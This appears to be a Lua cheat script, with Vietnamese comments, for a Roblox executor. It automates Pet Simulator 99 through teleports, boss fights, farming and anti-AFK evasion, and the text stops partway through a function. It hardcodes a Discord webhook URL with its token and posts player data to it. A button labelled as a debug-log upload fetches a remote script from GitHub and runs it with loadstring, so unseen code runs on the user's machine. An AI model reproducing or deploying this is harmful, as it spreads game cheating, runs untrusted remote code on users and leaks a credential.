--========================================================================
-- PS99 DIAMOND MOUNTAIN - SUMMIT AFK & YETI BOSS SUITE (DELTA EXECUTOR)
-- Phiên bản V6: Khắc phục triệt để lỗi "You can claim again in 18h37m",
-- nhận diện "The Shiny Yeti / Team up to beat it", không click nút Send Pets.
--========================================================================

-- 1. DIỆT SẠCH PHIÊN BẢN CŨ TRONG BỘ NHỚ KHI EXCUTE LẠI
local CURRENT_SESSION_ID = tick()
_G.PS99_SUMMIT_SESSION = CURRENT_SESSION_ID
_G.PS99_SUMMIT_RUNNING = false
task.wait(0.3)
_G.PS99_SUMMIT_RUNNING = true

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local GuiService = game:GetService("GuiService")
local VirtualUser = game:GetService("VirtualUser")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local RS = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")

local Player = Players.LocalPlayer or Players.PlayerAdded:Wait()
local Camera = workspace.CurrentCamera

pcall(function()
    StarterGui:SetCore("SendNotification", {
        Title = "💎 PS99 Summit Suite V6",
        Text = "Đang chạy phiên bản V6 tối ưu...",
        Duration = 3
    })
end)

-- Tìm nơi chứa GUI cho Delta Executor
local function getSafeGuiParent()
    if typeof(gethui) == "function" then
        local h = gethui()
        if h then return h end
    end
    local success, core = pcall(function() return game:GetService("CoreGui") end)
    if success and core then
        local canWrite = pcall(function()
            local t = Instance.new("Folder")
            t.Parent = core
            t:Destroy()
        end)
        if canWrite then return core end
    end
    return Player:WaitForChild("PlayerGui")
end

local GuiParent = getSafeGuiParent()

pcall(function()
    local containers = {}
    if typeof(gethui) == "function" then table.insert(containers, gethui()) end
    if game:GetService("CoreGui") then table.insert(containers, game:GetService("CoreGui")) end
    if Player:FindFirstChild("PlayerGui") then table.insert(containers, Player.PlayerGui) end

    for _, c in ipairs(containers) do
        for _, child in pairs(c:GetChildren()) do
            if child.Name == "PS99_Summit_Suite" then child:Destroy() end
        end
    end
end)

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PS99_Summit_Suite"
ScreenGui.ResetOnSpawn = false
ScreenGui.DisplayOrder = 999999
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = GuiParent

--========================================================================
-- TRẠNG THÁI VÀ CẤU HÌNH (STATE)
--========================================================================

local STATE = {
    -- [YETI BOSS]
    AutoYeti = true,
    AutoClickYeti = true,
    YetiKilledCount = 0,
    YetiCooldownAlert = true,
    IsFightingYeti = false,
    CurrentYetiObj = nil,
    YetiArenaCFrame = CFrame.new(-30054.5, 756.8, 31135.3),
    YetiStatusText = "⏳ Đang quét...",

    -- [HANG NÚI & TRỨNG]
    SelectedCave = 1,
    AutoCaveChests = false,
    AutoHatch = false,
    ShowHatchPopup = true,
    SkipAnimation = true,
    SelectedEggName = "Nearest",
    HatchAmount = 1,

    -- [BÃI FARM TIỀN]
    AutoFarmMoney = true,
    AutoHitBreakables = true,
    FarmCFrame = nil,

    -- [TỌA ĐỘ 6 HANG NÚI]
    CaveCFrames = {
        [1] = nil,
        [2] = nil,
        [3] = nil,
        [4] = nil,
        [5] = nil,
        [6] = nil,
    },

    -- [AFK & TIỆN ÍCH]
    AntiAFK = true,
    AutoReconnect = true,
    AutoCollectDrops = true,
    AutoClaimExpeditions = true,
    LowCpuMode = false,

    -- [DISCORD WEBHOOK]
    Webhook = "https://discord.com/api/webhooks/1557705516178874429/DSxD6hH0VRjmXxBB44kQVM3VDhNvUwTp7h4uTCCtZK1k4vOLyOxLtjAfwxK2mCSS0MFb",
    DiscordUserId = "",
    MentionOnHuge = true,
    MentionOnTitanic = true,
    ReportInterval = 15 * 60,

    -- [THỐNG KÊ]
    SessionStart = os.time(),
    StartingDiamonds = 0,
    TotalHuge = 0,
    TotalTitanic = 0,
    TotalGargantuan = 0,
    CurrentAction = "Sẵn sàng"
}

--========================================================================
-- GIAO DIỆN NGƯỜI DÙNG (UI)
--========================================================================

local ToggleButton = Instance.new("TextButton")
ToggleButton.Name = "ToggleButton"
ToggleButton.Size = UDim2.new(0, 50, 0, 50)
ToggleButton.Position = UDim2.new(0, 15, 0.45, 0)
ToggleButton.BackgroundColor3 = Color3.fromRGB(24, 28, 40)
ToggleButton.Text = "💎"
ToggleButton.TextSize = 24
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.Font = Enum.Font.GothamBold
ToggleButton.Parent = ScreenGui

local ToggleCorner = Instance.new("UICorner")
ToggleCorner.CornerRadius = UDim.new(1, 0)
ToggleCorner.Parent = ToggleButton

local ToggleStroke = Instance.new("UIStroke")
ToggleStroke.Color = Color3.fromRGB(80, 140, 255)
ToggleStroke.Thickness = 2
ToggleStroke.Parent = ToggleButton

local isDraggingBtn = false
local dragStartBtn, startPosBtn
ToggleButton.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDraggingBtn = true
        dragStartBtn = input.Position
        startPosBtn = ToggleButton.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then isDraggingBtn = false end
        end)
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if isDraggingBtn and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStartBtn
        ToggleButton.Position = UDim2.new(startPosBtn.X.Scale, startPosBtn.X.Offset + delta.X, startPosBtn.Y.Scale, startPosBtn.Y.Offset + delta.Y)
    end
end)

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.Size = UDim2.new(0, 510, 0, 360)
MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(18, 20, 28)
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Visible = true
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 12)
MainCorner.Parent = MainFrame

local MainStroke = Instance.new("UIStroke")
MainStroke.Color = Color3.fromRGB(45, 52, 70)
MainStroke.Thickness = 1.5
MainStroke.Parent = MainFrame

local isDraggingMain = false
local dragStartMain, startPosMain
MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        if input.Position.Y - MainFrame.AbsolutePosition.Y < 45 then
            isDraggingMain = true
            dragStartMain = input.Position
            startPosMain = MainFrame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then isDraggingMain = false end
            end)
        end
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if isDraggingMain and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStartMain
        MainFrame.Position = UDim2.new(startPosMain.X.Scale, startPosMain.X.Offset + delta.X, startPosMain.Y.Scale, startPosMain.Y.Offset + delta.Y)
    end
end)

local function toggleGui() MainFrame.Visible = not MainFrame.Visible end
ToggleButton.Activated:Connect(toggleGui)

-- TopBar
local TopBar = Instance.new("Frame")
TopBar.Size = UDim2.new(1, 0, 0, 42)
TopBar.BackgroundColor3 = Color3.fromRGB(24, 27, 38)
TopBar.BorderSizePixel = 0
TopBar.Parent = MainFrame

local TopBarCorner = Instance.new("UICorner")
TopBarCorner.CornerRadius = UDim.new(0, 12)
TopBarCorner.Parent = TopBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, -60, 1, 0)
TitleLabel.Position = UDim2.new(0, 12, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "💎 PS99 SUMMIT SUITE V6 | YETI & FARM"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextSize = 13
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.Parent = TopBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 30, 0, 30)
CloseBtn.Position = UDim2.new(1, -36, 0.5, -15)
CloseBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
CloseBtn.Text = "✕"
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 14
CloseBtn.Parent = TopBar

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 8)
CloseCorner.Parent = CloseBtn
CloseBtn.Activated:Connect(function() MainFrame.Visible = false end)

-- Sidebar
local Sidebar = Instance.new("Frame")
Sidebar.Size = UDim2.new(0, 125, 1, -42)
Sidebar.Position = UDim2.new(0, 0, 0, 42)
Sidebar.BackgroundColor3 = Color3.fromRGB(20, 22, 32)
Sidebar.BorderSizePixel = 0
Sidebar.Parent = MainFrame

local SidebarLayout = Instance.new("UIListLayout")
SidebarLayout.Padding = UDim.new(0, 4)
SidebarLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
SidebarLayout.Parent = Sidebar

local SidebarPad = Instance.new("UIPadding")
SidebarPad.PaddingTop = UDim.new(0, 8)
SidebarPad.Parent = Sidebar

local ContentContainer = Instance.new("Frame")
ContentContainer.Size = UDim2.new(1, -135, 1, -50)
ContentContainer.Position = UDim2.new(0, 130, 0, 46)
ContentContainer.BackgroundTransparency = 1
ContentContainer.Parent = MainFrame

local Pages = {}
local function createPage(name)
    local Page = Instance.new("ScrollingFrame")
    Page.Name = name
    Page.Size = UDim2.new(1, 0, 1, 0)
    Page.BackgroundTransparency = 1
    Page.ScrollBarThickness = 4
    Page.ScrollBarImageColor3 = Color3.fromRGB(80, 140, 255)
    Page.Visible = false
    Page.CanvasSize = UDim2.new(0, 0, 0, 440)
    Page.Parent = ContentContainer

    local Layout = Instance.new("UIListLayout")
    Layout.Padding = UDim.new(0, 6)
    Layout.Parent = Page

    local Pad = Instance.new("UIPadding")
    Pad.PaddingRight = UDim.new(0, 6)
    Pad.Parent = Page

    Pages[name] = Page
    return Page
end

local DashboardPage = createPage("Dashboard")
local YetiPage = createPage("Yeti")
local TrailsPage = createPage("Trails")
local FarmPage = createPage("Farm")
local SettingsPage = createPage("Settings")

local TabButtons = {}
local function addTabButton(text, pageName)
    local TabBtn = Instance.new("TextButton")
    TabBtn.Size = UDim2.new(1, -10, 0, 34)
    TabBtn.BackgroundColor3 = Color3.fromRGB(28, 32, 44)
    TabBtn.Text = text
    TabBtn.TextColor3 = Color3.fromRGB(180, 190, 210)
    TabBtn.Font = Enum.Font.GothamMedium
    TabBtn.TextSize = 11
    TabBtn.Parent = Sidebar

    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 8)
    Corner.Parent = TabBtn

    TabBtn.Activated:Connect(function()
        for pName, pFrame in pairs(Pages) do
            pFrame.Visible = (pName == pageName)
        end
        for _, btn in pairs(TabButtons) do
            btn.BackgroundColor3 = Color3.fromRGB(28, 32, 44)
            btn.TextColor3 = Color3.fromRGB(180, 190, 210)
        end
        TabBtn.BackgroundColor3 = Color3.fromRGB(50, 110, 220)
        TabBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    end)

    table.insert(TabButtons, TabBtn)
    return TabBtn
end

local btnDash = addTabButton("📊 Tổng Quan", "Dashboard")
addTabButton("👹 Yeti Boss", "Yeti")
addTabButton("⛰️ Hang & Trứng", "Trails")
addTabButton("💰 Bãi Farm Tiền", "Farm")
addTabButton("⚙️ Cài Đặt AFK", "Settings")

btnDash.BackgroundColor3 = Color3.fromRGB(50, 110, 220)
btnDash.TextColor3 = Color3.fromRGB(255, 255, 255)
DashboardPage.Visible = true

local function createToggle(parent, title, defaultVal, callback)
    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(1, 0, 0, 38)
    Frame.BackgroundColor3 = Color3.fromRGB(24, 28, 40)
    Frame.Parent = parent

    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 8)
    Corner.Parent = Frame

    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, -60, 1, 0)
    Label.Position = UDim2.new(0, 10, 0, 0)
    Label.BackgroundTransparency = 1
    Label.Text = title
    Label.TextColor3 = Color3.fromRGB(230, 230, 230)
    Label.Font = Enum.Font.GothamMedium
    Label.TextSize = 11
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = Frame

    local ToggleBtn = Instance.new("TextButton")
    ToggleBtn.Size = UDim2.new(0, 42, 0, 22)
    ToggleBtn.Position = UDim2.new(1, -50, 0.5, -11)
    ToggleBtn.BackgroundColor3 = defaultVal and Color3.fromRGB(40, 180, 90) or Color3.fromRGB(70, 75, 90)
    ToggleBtn.Text = defaultVal and "BẬT" or "TẮT"
    ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    ToggleBtn.Font = Enum.Font.GothamBold
    ToggleBtn.TextSize = 10
    ToggleBtn.Parent = Frame

    local BtnCorner = Instance.new("UICorner")
    BtnCorner.CornerRadius = UDim.new(0, 6)
    BtnCorner.Parent = ToggleBtn

    local isToggled = defaultVal
    ToggleBtn.Activated:Connect(function()
        isToggled = not isToggled
        ToggleBtn.BackgroundColor3 = isToggled and Color3.fromRGB(40, 180, 90) or Color3.fromRGB(70, 75, 90)
        ToggleBtn.Text = isToggled and "BẬT" or "TẮT"
        callback(isToggled)
    end)
    return Frame
end

local function createActionButton(parent, text, color, callback)
    local Btn = Instance.new("TextButton")
    Btn.Size = UDim2.new(1, 0, 0, 34)
    Btn.BackgroundColor3 = color or Color3.fromRGB(50, 110, 220)
    Btn.Text = text
    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    Btn.Font = Enum.Font.GothamBold
    Btn.TextSize = 11
    Btn.Parent = parent

    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 8)
    Corner.Parent = Btn

    Btn.Activated:Connect(callback)
    return Btn
end

local function createInfoCard(parent, title, defaultText)
    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(1, 0, 0, 38)
    Frame.BackgroundColor3 = Color3.fromRGB(24, 28, 40)
    Frame.Parent = parent

    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 8)
    Corner.Parent = Frame

    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(0.5, 0, 1, 0)
    Title.Position = UDim2.new(0, 10, 0, 0)
    Title.BackgroundTransparency = 1
    Title.Text = title
    Title.TextColor3 = Color3.fromRGB(160, 170, 190)
    Title.Font = Enum.Font.GothamMedium
    Title.TextSize = 11
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.Parent = Frame

    local Value = Instance.new("TextLabel")
    Value.Size = UDim2.new(0.5, -12, 1, 0)
    Value.Position = UDim2.new(0.5, 0, 0, 0)
    Value.BackgroundTransparency = 1
    Value.Text = defaultText
    Value.TextColor3 = Color3.fromRGB(255, 255, 255)
    Value.Font = Enum.Font.GothamBold
    Value.TextSize = 11
    Value.TextXAlignment = Enum.TextXAlignment.Right
    Value.Parent = Frame

    return Value
end

-- TRANG 1: DASHBOARD
local lblAction = createInfoCard(DashboardPage, "⚡ Hoạt Động:", STATE.CurrentAction)
local lblYetiStatus = createInfoCard(DashboardPage, "👹 Tình Trạng Yeti:", STATE.YetiStatusText)
local lblYetiCount = createInfoCard(DashboardPage, "🏆 Số Yeti Đã Diệt:", "0 con")
local lblDiamonds = createInfoCard(DashboardPage, "💎 Kim Cương:", "Đang tải...")
local lblDiffDiamonds = createInfoCard(DashboardPage, "📈 Cày Được:", "+0 (+0/h)")
local lblUptime = createInfoCard(DashboardPage, "⏱️ Thời Gian Treo:", "00h 00m 00s")
local lblPets = createInfoCard(DashboardPage, "🐾 Huge / Titanic:", "0 / 0")

-- TRANG 2: YETI BOSS
createToggle(YetiPage, "👹 Auto Tele & Đánh Yeti Khi Hồi Sinh", STATE.AutoYeti, function(v) STATE.AutoYeti = v end)
createToggle(YetiPage, "⚡ Auto Click & Xuất Pet Đánh Yeti", STATE.AutoClickYeti, function(v) STATE.AutoClickYeti = v end)
createToggle(YetiPage, "🔔 Báo Webhook Khi Hạ Gục Yeti", STATE.YetiCooldownAlert, function(v) STATE.YetiCooldownAlert = v end)

createActionButton(YetiPage, "📍 Lưu Vị Trí Đấu Trường Yeti (Đứng Tại Bãi Boss)", Color3.fromRGB(40, 140, 90), function()
    local char = Player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if hrp then
        STATE.YetiArenaCFrame = hrp.CFrame
        pcall(function()
            StarterGui:SetCore("SendNotification", {
                Title = "📍 Lưu Đấu Trường Yeti",
                Text = "Đã ghim tọa độ đấu trường Yeti thành công!",
                Duration = 3
            })
        end)
    end
end)

createActionButton(YetiPage, "🚀 Tele Tới Đấu Trường Yeti Ngay", Color3.fromRGB(80, 100, 160), function()
    local char = Player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if STATE.YetiArenaCFrame and hrp then
        hrp.CFrame = STATE.YetiArenaCFrame + Vector3.new(0, 3, 0)
    end
end)

createActionButton(YetiPage, "🔄 Đặt Lại Bộ Đếm Yeti (Reset Count)", Color3.fromRGB(180, 80, 50), function()
    STATE.YetiKilledCount = 0
    lblYetiCount.Text = "0 con"
end)

createActionButton(YetiPage, "🔄 Reconnect Server (Làm Sạch Lỗi Click Bản Cũ)", Color3.fromRGB(200, 60, 60), function()
    TeleportService:Teleport(game.PlaceId, Player)
end)

-- TRANG 3: HANG NÚI & TRỨNG
local lblSelectedEgg = createInfoCard(TrailsPage, "🥚 Trứng Đã Chọn:", STATE.SelectedEggName)

createActionButton(TrailsPage, "🔍 Quét Quả Trứng Đang Đứng Trước Mặt", Color3.fromRGB(40, 160, 120), function()
    local Things = workspace:FindFirstChild("__THINGS")
    local EggsFolder = Things and Things:FindFirstChild("Eggs")
    local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    local found = nil
    if hrp and EggsFolder then
        local minDist = 90
        for _, egg in pairs(EggsFolder:GetChildren()) do
            local part = egg:IsA("BasePart") and egg or (egg:IsA("Model") and (egg.PrimaryPart or egg:FindFirstChildWhichIsA("BasePart")))
            if part then
                local dist = (part.Position - hrp.Position).Magnitude
                if dist < minDist then
                    minDist = dist
                    found = egg.Name
                end
            end
        end
    end
    if not found then
        for _, obj in pairs(workspace:GetChildren()) do
            if obj:IsA("Model") and string.find(string.lower(obj.Name), "egg") then
                found = obj.Name
                break
            end
        end
    end
    if found then
        STATE.SelectedEggName = found
        lblSelectedEgg.Text = found
        pcall(function()
            StarterGui:SetCore("SendNotification", {
                Title = "🥚 Đã Tìm Thấy Trứng!",
                Text = "Đã chọn: " .. found,
                Duration = 3
            })
        end)
    else
        pcall(function()
            StarterGui:SetCore("SendNotification", {
                Title = "⚠️ Chưa Thấy Trứng",
                Text = "Hãy đứng lại sát quả trứng trong hang rồi bấm lại nút này nhé!",
                Duration = 3
            })
        end)
    end
end)

local CaveSelectorFrame = Instance.new("Frame")
CaveSelectorFrame.Size = UDim2.new(1, 0, 0, 42)
CaveSelectorFrame.BackgroundColor3 = Color3.fromRGB(24, 28, 40)
CaveSelectorFrame.Parent = TrailsPage

local CaveCorner = Instance.new("UICorner")
CaveCorner.CornerRadius = UDim.new(0, 8)
CaveCorner.Parent = CaveSelectorFrame

local CaveLabel = Instance.new("TextLabel")
CaveLabel.Size = UDim2.new(0, 75, 1, 0)
CaveLabel.Position = UDim2.new(0, 8, 0, 0)
CaveLabel.BackgroundTransparency = 1
CaveLabel.Text = "Chọn Hang:"
CaveLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
CaveLabel.Font = Enum.Font.GothamMedium
CaveLabel.TextSize = 11
CaveLabel.TextXAlignment = Enum.TextXAlignment.Left
CaveLabel.Parent = CaveSelectorFrame

local caveButtons = {}
for i = 1, 6 do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 36, 0, 26)
    btn.Position = UDim2.new(0, 80 + (i - 1) * 42, 0.5, -13)
    btn.BackgroundColor3 = (STATE.SelectedCave == i) and Color3.fromRGB(50, 110, 220) or Color3.fromRGB(35, 40, 55)
    btn.Text = "H" .. i
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 11
    btn.Parent = CaveSelectorFrame

    local bCorner = Instance.new("UICorner")
    bCorner.CornerRadius = UDim.new(0, 6)
    bCorner.Parent = btn

    btn.Activated:Connect(function()
        STATE.SelectedCave = i
        for idx, b in ipairs(caveButtons) do
            b.BackgroundColor3 = (idx == i) and Color3.fromRGB(50, 110, 220) or Color3.fromRGB(35, 40, 55)
        end
    end)
    table.insert(caveButtons, btn)
end

createActionButton(TrailsPage, "📍 Lưu Vị Trí Hang Đang Đứng Cho Hang Đã Chọn", Color3.fromRGB(40, 140, 90), function()
    local char = Player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if hrp then
        STATE.CaveCFrames[STATE.SelectedCave] = hrp.CFrame
        pcall(function()
            StarterGui:SetCore("SendNotification", {
                Title = "📍 Lưu Tọa Độ",
                Text = "Đã lưu vị trí Hang " .. STATE.SelectedCave .. " thành công!",
                Duration = 3
            })
        end)
    end
end)

createActionButton(TrailsPage, "🚀 Teleport Tới Hang Đã Chọn Ngay", Color3.fromRGB(80, 100, 160), function()
    local pos = STATE.CaveCFrames[STATE.SelectedCave]
    local char = Player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if pos and hrp then hrp.CFrame = pos + Vector3.new(0, 3, 0) end
end)

createToggle(TrailsPage, "📦 Auto Phá Rương (Chests) Trong Hang", STATE.AutoCaveChests, function(v) STATE.AutoCaveChests = v end)
createToggle(TrailsPage, "🥚 Auto Mở Trứng (Auto Hatch Egg)", STATE.AutoHatch, function(v) STATE.AutoHatch = v end)
createToggle(TrailsPage, "🎁 Hiện Pop-up Kết Quả (Tự đóng sau 1.2s)", STATE.ShowHatchPopup, function(v) STATE.ShowHatchPopup = v end)
createToggle(TrailsPage, "⏩ Bỏ Qua Cắt Cảnh (Skip Cutscene Animation)", STATE.SkipAnimation, function(v) STATE.SkipAnimation = v end)

-- TRANG 4: BÃI FARM TIỀN
createToggle(FarmPage, "💰 Tự Động Về Farm Tiền (Khi không mở trứng)", STATE.AutoFarmMoney, function(v) STATE.AutoFarmMoney = v end)
createToggle(FarmPage, "⛏️ Auto Đánh Đá / Breakables Bãi Farm", STATE.AutoHitBreakables, function(v) STATE.AutoHitBreakables = v end)

createActionButton(FarmPage, "📍 Lưu Vị Trí Đang Đứng Làm Bãi Farm", Color3.fromRGB(40, 140, 90), function()
    local char = Player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if hrp then
        STATE.FarmCFrame = hrp.CFrame
        pcall(function()
            StarterGui:SetCore("SendNotification", {
                Title = "📍 Lưu Bãi Farm",
                Text = "Đã lưu bãi cày tiền hiện tại thành công!",
                Duration = 3
            })
        end)
    end
end)

createActionButton(FarmPage, "🚀 Teleport Về Bãi Farm Ngay", Color3.fromRGB(80, 100, 160), function()
    local char = Player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if STATE.FarmCFrame and hrp then hrp.CFrame = STATE.FarmCFrame + Vector3.new(0, 3, 0) end
end)

-- TRANG 5: CÀI ĐẶT
createToggle(SettingsPage, "🛡️ Anti-AFK (Chống văng 20 phút)", STATE.AntiAFK, function(v) STATE.AntiAFK = v end)
createToggle(SettingsPage, "🔄 Auto Reconnect Khi Đứt Mạng", STATE.AutoReconnect, function(v) STATE.AutoReconnect = v end)
createToggle(SettingsPage, "🧲 Auto Hút Orbs & Nhặt Lootbags", STATE.AutoCollectDrops, function(v) STATE.AutoCollectDrops = v end)
createToggle(SettingsPage, "🏆 Auto Nhận Expeditions Đỉnh Núi", STATE.AutoClaimExpeditions, function(v) STATE.AutoClaimExpeditions = v end)
createToggle(SettingsPage, "🔋 Low CPU Mode (Màn Đen Tiết Kiệm Pin)", STATE.LowCpuMode, function(v)
    STATE.LowCpuMode = v
    pcall(function() RunService:Set3dRenderingEnabled(not v) end)
end)

-- NÚT DUMP LOG DEBUG
createActionButton(SettingsPage, "📋 Quét & Gửi Log Debug Về Discord", Color3.fromRGB(40, 160, 120), function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Vt47/ps99-scripts/main/dump_info.lua"))()
    end)
end)

pcall(function()
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if not gameProcessed and input.KeyCode == Enum.KeyCode.RightShift then toggleGui() end
    end)
end)

--========================================================================
-- HỆ THỐNG XỬ LÝ NGẦM CHUYÊN SÂU
--========================================================================

task.spawn(function()
    local req = request or http_request or (syn and syn.request) or (http and http.request)

    local function sendWebhook(title, description, color, mention)
        if not req or not STATE.Webhook or STATE.Webhook == "" then return end
        pcall(function()
            local embed = {
                description = description,
                color = color or 5793266,
                footer = { text = "PS99 Summit Suite | " .. Player.Name },
                timestamp = DateTime.now():ToIsoDate()
            }
            if title and title ~= "" then embed.title = title end
            req({
                Url = STATE.Webhook,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({
                    username = "Diamond Mountain Monitor",
                    content = mention or "",
                    embeds = { embed }
                })
            })
        end)
    end

    local Library, Client, Directory, Save, PetDirectory, Network
    pcall(function()
        Library = RS:WaitForChild("Library", 8)
        if Library then
            Client = Library:FindFirstChild("Client")
            Directory = Library:FindFirstChild("Directory")
            if Client and Client:FindFirstChild("Save") then Save = require(Client.Save) end
            if Directory and Directory:FindFirstChild("Pets") then PetDirectory = require(Directory.Pets) end
            if Client and Client:FindFirstChild("Network") then Network = require(Client.Network) end
        end
    end)
    if not Network and RS:FindFirstChild("Network") then Network = RS.Network end

    local function formatNumber(n)
        n = tonumber(n) or 0
        local sign = n < 0 and "-" or ""
        n = math.abs(n)
        if n >= 1e12 then return sign .. string.format("%.2fT", n / 1e12)
        elseif n >= 1e9 then return sign .. string.format("%.2fB", n / 1e9)
        elseif n >= 1e6 then return sign .. string.format("%.2fM", n / 1e6)
        elseif n >= 1e3 then return sign .. string.format("%.2fK", n / 1e3) end
        return sign .. tostring(math.floor(n))
    end

    local function formatDuration(seconds)
        seconds = math.max(0, math.floor(seconds))
        local h = math.floor(seconds / 3600)
        local m = math.floor((seconds % 3600) / 60)
        local s = seconds % 60
        return string.format("%02dh %02dm %02ds", h, m, s)
    end

    local function getDiamonds()
        local data
        pcall(function() if Save and Save.Get then data = Save.Get() end end)
        if not data or not data.Inventory or not data.Inventory.Currency then return 0 end
        for _, curr in pairs(data.Inventory.Currency) do
            if curr.id == "Diamonds" then return tonumber(curr._am) or 0 end
        end
        return 0
    end

    STATE.StartingDiamonds = getDiamonds()

    task.wait(1)
    local char = Player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if hrp and not STATE.FarmCFrame then
        STATE.FarmCFrame = hrp.CFrame
    end

    local function safeTeleport(cframe)
        if not cframe then return end
        local c = Player.Character
        local h = c and c:FindFirstChild("HumanoidRootPart")
        if h then h.CFrame = cframe + Vector3.new(0, 3, 0) end
    end

    -- BỘ QUÉT TÌM YETI CHÍNH XÁC (DỰA TRÊN DỮ LIỆU THỰC TẾ BREAKABLES & GUI YETI)
    local function checkYetiBoss()
        -- 1. Kiểm tra Breakables thực tế trong workspace.__THINGS.Breakables TRƯỚC TIÊN
        -- Dữ liệu scan chứng minh 100%: Yeti là một Breakable có BreakableID = "Yeti" và AreaID = "Yeti"
        local Things = workspace:FindFirstChild("__THINGS")
        local Breakables = Things and Things:FindFirstChild("Breakables")
        if Breakables then
            for _, b in pairs(Breakables:GetChildren()) do
                local bId = tostring(b:GetAttribute("BreakableID") or "")
                local areaId = tostring(b:GetAttribute("AreaID") or "")
                if string.lower(bId) == "yeti" or string.lower(areaId) == "yeti" then
                    local part = b:IsA("BasePart") and b or (b:IsA("Model") and (b.PrimaryPart or b:FindFirstChildWhichIsA("BasePart", true)))
                    if part then
                        return b, part.CFrame, nil
                    elseif STATE.YetiArenaCFrame then
                        return b, STATE.YetiArenaCFrame, nil
                    end
                end
            end
        end

        -- 2. Quét PlayerGui (Khi người chơi ở xa chưa stream Breakables đỉnh núi)
        local isCooldown = false
        local cdString = nil
        local isBossActiveGui = false

        pcall(function()
            for _, g in pairs(Player.PlayerGui:GetDescendants()) do
                if (g:IsA("TextLabel") or g:IsA("TextButton")) and g.Visible and g.Text ~= "" then
                    -- Bỏ qua hoàn toàn bảng quà tặng Free Gifts & Vé rút thưởng
                    local pName = g.Parent and g.Parent.Name or ""
                    if pName ~= "Free" and pName ~= "ItemChances" and g.Name ~= "ClaimTimer" then
                        local t = string.lower(g.Text)

                        -- A. Cooldown Yeti thật
                        if string.find(t, "yeti") and (string.find(t, "returns in") or string.find(t, "again in") or string.find(t, "respawn in") or string.find(t, "next yeti")) then
                            isCooldown = true
                            cdString = string.match(g.Text, "%d+:%d+") or g.Text
                            break
                        end

                        -- B. Nhận diện Yeti Boss Đang Giao Tranh (Parent == "Yeti" hoặc các biến thể)
                        if (pName == "Yeti" or string.find(t, "golden yeti") or string.find(t, "shiny yeti") or string.find(t, "the yeti") or string.find(t, "team up to beat it"))
                           and not string.find(t, "returns") and not string.find(t, "again in") and not string.find(t, "leaderboard") then
                            isBossActiveGui = true
                        end
                    end
                end
            end
        end)

        -- Nếu đang có banner đếm ngược Yeti Cooldown -> Yeti CHẮC CHẮN chưa hồi sinh
